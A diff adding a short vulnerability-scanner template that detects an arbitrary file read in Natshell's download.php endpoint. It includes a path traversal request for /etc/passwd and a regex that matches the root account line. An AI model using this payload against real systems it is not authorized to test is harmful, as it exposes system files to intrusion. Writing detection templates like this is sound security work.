@@ -1,0 +1,21 @@
+id: poc-yaml-natshell-arbitrary-file-read
+info:
+  name: Natshell Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in Natshell by exploiting the '/download.php' endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "(root|toor):[x*]:0:0:"
